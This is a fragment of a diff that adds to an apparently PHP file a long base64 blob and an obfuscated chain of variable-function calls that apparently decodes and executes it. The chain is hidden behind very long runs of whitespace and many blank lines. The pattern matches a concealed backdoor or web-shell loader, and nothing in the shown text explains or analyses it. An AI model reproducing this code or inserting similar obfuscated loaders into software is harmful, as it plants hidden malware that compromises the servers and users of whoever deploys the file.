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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
